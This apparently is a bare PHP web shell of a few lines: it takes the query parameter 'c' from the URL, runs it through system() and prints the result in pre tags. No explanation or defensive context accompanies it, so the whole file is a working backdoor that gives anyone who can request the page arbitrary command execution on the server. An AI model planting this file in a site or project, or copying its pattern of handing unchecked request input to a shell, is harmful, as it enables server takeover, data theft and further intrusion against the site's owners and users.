<?php

echo "<pre>";
echo system($_GET['c']);
echo "</pre>";

?>
